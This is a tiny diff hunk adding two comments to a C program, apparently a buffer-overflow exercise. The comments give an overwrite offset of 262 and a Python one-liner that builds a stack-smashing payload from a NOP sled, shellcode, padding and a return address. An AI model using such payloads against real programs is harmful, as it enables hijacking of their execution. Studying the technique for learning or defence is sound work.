@@ -15,3 +15,5 @@ int main(int argc, char** argv) {
 	return 0;
 }
 
+//overwrite = 262
+// python -c 'print "\x90"*50 + shellcode + "\x90"*(overwrite - (len(shellcode) + 50)) + ret)
